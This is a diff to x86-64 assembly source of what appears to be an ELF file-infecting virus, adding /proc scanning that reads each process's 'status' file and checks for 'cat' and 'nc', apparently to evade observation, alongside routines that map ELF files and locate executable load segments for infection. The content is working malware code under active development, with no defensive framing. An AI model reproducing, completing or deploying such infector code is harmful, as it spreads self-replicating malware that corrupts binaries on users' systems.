@@ -226,19 +226,39 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 			; process
 			and rax, 0o0170000 ; S_IFMT
+			cmp rax, 0o0040000 ; S_IFDIR
+			je .process_dir
 			cmp rax, 0o0100000 ; S_IFREG
+			jne .free_buffers
+
+			push rdi
+			push rsi
+			mov rdi, rbx
+			lea rsi, [rel process_status]
+			call _ft_strcmp
+			pop rsi
+			pop rdi
+
+			cmp rax, 0x0
 			jne .free_buffers
 			call _check_file_process
 
-			add rsp, 600
-			pop r11 ; stat using r11
-			add rsp, 4096
-			pop rbx
-
 			cmp rax, 0x0
-			jne .get_rcx_close
+			jne .process_found
+			jmp .free_buffers
 
-			jmp .next_file
+			.process_dir:
+				push rdi
+				mov rdi, rbx
+				call _ft_isnum
+				pop rdi
+				cmp rax, 0x0
+				je .free_buffers
+				mov rsi, r13
+				call _move_through_dir
+				cmp rax, 0x0
+				jne .process_found
+				jmp .free_buffers
 
 			.infect:
 				cmp rax, 0o0040000 ; S_IFDIR
@@ -271,7 +291,11 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 			pop rdi
 			jmp .loop_in_file
 
-	.get_rcx_close:
+	.process_found:
+		add rsp, 600
+		pop r11 ; stat using r11
+		add rsp, 4096
+		pop rbx
 		pop rcx
 	.close:
 		push rax
@@ -366,6 +390,7 @@ _infect_file: ; (string rdi, stat rsi)
 	.is_elf_file:
 		; TODO: do 32 bits version (new compilation ?)
 
+
 		; get pt_load exec
 		mov ax, [r13 + 56]; e_phnum
 		mov rbx, r13
@@ -452,14 +477,14 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rax
 			syscall
 	.unmap:
-;		push r11; munmap using r11 ?
+		push r11; munmap using r11 ?
 		push r13
 		pop rdi
 		mov rsi, [r12 + 48] ; statbuf.st_size
 		push 11
 		pop rax; munmap
 		syscall
-;		pop r11
+		pop r11
 	.close:
 		push r11
 		pop rdi
@@ -522,16 +547,6 @@ _check_file_process:; (string rdi, stat rsi)
 		cmp rax, 0x0
 		je .close
 
-;		%ifdef DEBUG
-;			push r11
-;			mov rdi, 1
-;			mov rdx, rax
-;			mov rax, 1
-;			syscall
-;			mov rax, rdx
-;			pop r11
-;		%endif
-
 			mov r8, rax
 			mov r13, rsp
 			lea rsi, [rel process]
@@ -567,8 +582,9 @@ _check_file_process:; (string rdi, stat rsi)
 				cmp byte[rsi + rcx], 0x0
 				jnz .loop_array_string
 
-		add rsp, 0x1000
-		jmp .loop_read
+	xor rax, rax
+;		add rsp, 0x1000
+;		jmp .loop_read
 	.close:
 		push rax
 		pop rsi
@@ -621,6 +637,28 @@ _exit:
 	syscall
 
 ; ================================ utils =======================================
+
+_ft_isnum:; (string rdi) ; 1 yes 0 no
+	push rcx
+
+	push 1
+	pop rax
+	xor rcx, rcx
+	.loop_char:
+		cmp byte[rdi + rcx], 0x0
+		je .return
+		cmp byte[rdi + rcx], '0'
+		jl .isnotnum
+		cmp byte[rdi + rcx], '9'
+		jg .isnotnum
+		inc rcx
+	jmp .loop_char
+	.isnotnum:
+		xor rax,rax
+	.return:
+
+	pop rcx
+ret
 
 _ft_strlen:; (string rdi)
 	push rcx
@@ -728,6 +766,17 @@ _ft_strcmp: ; (string rdi, string rsi)
 	call _ft_strlen
 	push rax
 	pop rdx
+	push rdi
+	push rsi
+	pop rdi
+	call _ft_strlen
+	push rdi
+	pop rsi
+	pop rdi
+	cmp rax, rdx
+	je .continue
+	inc rdx
+	.continue:
 	call _ft_memcmp
 	pop rdx
 ret
@@ -753,7 +802,8 @@ ret
 ; ==============================================================================
 
 process_dir db `/proc`, 0x0
-process db ` cat `, 0x0, ` nc `, 0x0, 0x0
+process_status db `status`, 0x0
+process db `cat`, 0x0, `nc`, 0x0, 0x0
 
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
